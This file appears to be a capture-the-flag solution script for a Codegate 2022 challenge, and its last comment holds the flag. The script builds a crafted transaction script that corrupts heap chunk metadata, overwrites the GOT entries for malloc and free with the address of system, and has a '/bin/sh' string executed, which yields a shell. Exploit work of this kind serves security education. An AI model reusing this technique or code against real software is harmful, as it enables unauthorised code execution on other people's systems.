#!/usr/bin/env python3
import struct


def gen_push(val):
    if len(val) < 0x4C:
        return struct.pack("<B", len(val)) + val
    return struct.pack("<BB", 0x4C, len(val)) + val


script = b""
script += gen_push(b"                        /bin/sh\0")
script += gen_push(b"\xff" * 8)
script += gen_push(b"\xff" * 8)
script += gen_push(b"\xff" * 8)
script += gen_push(b"\xff" * 8)
script += gen_push(b"\xff" * 8)
script += gen_push(b"\xff" * 8)
script += gen_push(b"\xff" * 8)
malloc_got = 0x00000000004571F8
free_got = 0x00000000004571C0
script += gen_push(
    b"\xaa" * 24
    + struct.pack("<Q", 0x191)
    + struct.pack("<QQQ", malloc_got, malloc_got + 4, malloc_got + 4)
    + struct.pack("<QQQ", malloc_got + 4, malloc_got + 8, malloc_got + 8)
    + struct.pack("<QQQ", free_got + 4, free_got + 8, free_got + 8)
    + struct.pack("<QQQ", free_got, free_got + 4, free_got + 4)
)
script += b"\xbb"  # secret
script += gen_push(b"\xdd" * 32) + b"\x75"  # drop, trigger free()
script += b"\x75" * 4
script += gen_push(b"\x03") + b"\x79"  # top=lowdword(__GI___libc_malloc)
system = 0x50ae0
malloc = 0xa49b0
script += gen_push(struct.pack("<I", malloc - system)) + b"\x93"  # add, wtf?
script += b"\xbb"  # free@got[lo] = system[lo]
script += b"\x7c" + gen_push(b"\x02") + b"\x79"  # swap, pick, top=hidword(__GI___libc_malloc)
script += b"\xbb"  # free@got[hi] = system[hi]
# thx vos
print(
    "0100000001777777777777777777777777777777777777777777777777777777777777777700000000",
    end="",
)
assert(len(script) >= 0xfd)
print(struct.pack("<BH", 0xfd, len(script)).hex(), end="")
print(script.hex(), end="")
print(
    "ffffffff010000000000000000195555555555555555555555555555555555555555555555555500000000",
    end="",
)

# codegate2022{77bb96e81061bd1381b64e58e7ae9918c0f1924e0c29ed8330e2a5b4586c77af}
